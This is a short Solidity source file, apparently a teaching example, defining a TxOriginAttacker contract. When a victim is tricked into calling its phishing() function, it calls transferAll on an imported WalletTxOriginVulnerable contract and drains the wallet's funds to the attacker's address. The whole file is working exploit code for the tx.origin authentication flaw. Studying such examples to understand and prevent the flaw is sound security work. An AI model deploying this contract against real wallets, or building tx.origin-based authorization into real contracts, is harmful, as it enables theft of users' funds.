// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {WalletTxOriginVulnerable} from "./WalletTxOriginVulnerable.sol";

contract TxOriginAttacker {
    WalletTxOriginVulnerable public target;
    address payable public attackerEOA;

    constructor(address _target, address payable _attackerEOA) {
        target = WalletTxOriginVulnerable(_target);
        attackerEOA = _attackerEOA;
    }

    // Victim is tricked into calling this function
    function phishing() external {
        target.transferAll(attackerEOA);
    }
}
